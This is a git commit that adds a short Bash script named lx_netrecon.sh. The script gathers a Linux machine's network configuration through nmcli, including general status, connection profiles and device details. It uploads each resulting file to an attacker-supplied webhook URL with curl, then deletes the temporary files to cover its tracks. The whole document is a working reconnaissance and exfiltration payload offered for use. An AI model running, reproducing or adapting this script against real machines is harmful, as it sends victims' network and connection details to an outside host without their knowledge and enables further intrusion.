619640170a570decc918b1b08715332f2540c442
zulkir11 <46736360+zulkir11@users.noreply.github.com>
2023-06-07 22:25:14 -0400

    Create lx_netrecon.sh

---
+++ lx_netrecon.sh
@@ -0,0 +1,14 @@
+#!/bin/bash
+
+WEBHOOK_URL=$1
+TMP_FOLDER_PATH=$(mktemp -d -p "/tmp" prefix-XXXXXXXXXX)
+
+nmcli > "$TMP_FOLDER_PATH/nmcli.txt"
+nmcli connection show > "$TMP_FOLDER_PATH/nmcli_connection.txt"
+nmcli device show > "$TMP_FOLDER_PATH/nmcli_device.txt"
+
+curl -F "file=@$TMP_FOLDER_PATH/nmcli.txt" $WEBHOOK_URL
+curl -F "file=@$TMP_FOLDER_PATH/nmcli_connection.txt" $WEBHOOK_URL
+curl -F "file=@$TMP_FOLDER_PATH/nmcli_device.txt" $WEBHOOK_URL
+
+rm -rf "$TMP_FOLDER_PATH"
